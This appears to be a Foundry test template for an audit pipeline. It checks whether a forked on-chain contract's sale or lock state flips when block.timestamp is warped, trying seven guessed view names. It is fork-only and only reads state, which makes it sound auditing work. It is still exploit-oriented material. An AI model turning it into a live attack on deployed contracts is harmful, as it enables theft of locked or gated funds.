// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Timestamp dependence (miner-controllable block.timestamp)
/// @notice DASP / SmartBugs-Curated category: time_manipulation. The target gates
///         a payout, lock, or outcome on `block.timestamp` (or treats it as
///         entropy). A block producer can shift the timestamp by the consensus
///         drift (a few seconds, more on some chains) to cross the gate early or
///         to steer a timestamp-derived "random" outcome.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. Adapt IVictim to the target's real ABI: the
///      view that reads the time-gated state, and the entry point the gate
///      protects.
///      Passing = the observable state flips with block.timestamp alone (the
///      gate is producer-controllable) = reproduced.
///      Failing = the gate does not move with the timestamp, or is bound to a
///      non-manipulable clock = did NOT reproduce.

interface IVictim {
    // TODO: the view that exposes the time-gated state (e.g. isSaleFinished(),
    // isUnlocked(), winner(), hasEnded()).
    function isSaleFinished() external view returns (bool);
    // TODO: the entry the gate protects (claim / withdraw / buy).
    function claim() external;
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// Read a bool at `t`, warp to `t + 1 days`, read again. `found` is false
    /// when the reader does not exist; `flipped` is the reproduction.
    function _flips(bytes memory data) internal returns (bool found, bool flipped) {
        uint256 t0 = block.timestamp;
        vm.warp(t0);
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (!ok || ret.length < 32) return (false, false);
        bool before = abi.decode(ret, (bool));

        vm.warp(t0 + 1 days);
        (ok, ret) = target.staticcall(data);
        if (!ok || ret.length < 32) return (false, false);
        bool afterWarp = abi.decode(ret, (bool));

        vm.warp(t0);
        return (true, before != afterWarp);
    }

    function test_exploit() public {
        // The gate view is a GUESS on an unverified target, and a single wrong
        // name reports "not reproduced" for a vulnerability that exists under
        // another. Reproduced = block.timestamp ALONE flips the gated state.
        bool found;
        bool flipped;
        bool reproduced;

        (found, flipped) = _flips(abi.encodeWithSignature("isSaleFinished()"));
        console.log("tried isSaleFinished()", found ? (flipped ? "flips" : "stable") : "absent");
        if (found && flipped) reproduced = true;

        if (!reproduced) {
            (found, flipped) = _flips(abi.encodeWithSignature("saleEnded()"));
            console.log("tried saleEnded()", found ? (flipped ? "flips" : "stable") : "absent");
            if (found && flipped) reproduced = true;
        }
        if (!reproduced) {
            (found, flipped) = _flips(abi.encodeWithSignature("isFinished()"));
            console.log("tried isFinished()", found ? (flipped ? "flips" : "stable") : "absent");
            if (found && flipped) reproduced = true;
        }
        if (!reproduced) {
            (found, flipped) = _flips(abi.encodeWithSignature("hasEnded()"));
            console.log("tried hasEnded()", found ? (flipped ? "flips" : "stable") : "absent");
            if (found && flipped) reproduced = true;
        }
        if (!reproduced) {
            (found, flipped) = _flips(abi.encodeWithSignature("ended()"));
            console.log("tried ended()", found ? (flipped ? "flips" : "stable") : "absent");
            if (found && flipped) reproduced = true;
        }
        if (!reproduced) {
            (found, flipped) = _flips(abi.encodeWithSignature("isOpen()"));
            console.log("tried isOpen()", found ? (flipped ? "flips" : "stable") : "absent");
            if (found && flipped) reproduced = true;
        }
        if (!reproduced) {
            (found, flipped) = _flips(abi.encodeWithSignature("saleClosed()"));
            console.log("tried saleClosed()", found ? (flipped ? "flips" : "stable") : "absent");
            if (found && flipped) reproduced = true;
        }

        assertTrue(
            reproduced,
            "no time-gated view moved with block.timestamp alone. Tried isSaleFinished(), saleEnded(), isFinished(), hasEnded(), ended(), isOpen(), saleClosed(). This does NOT establish safety: the gate may be named differently, or bound to a clock a producer cannot steer."
        );
    }
}
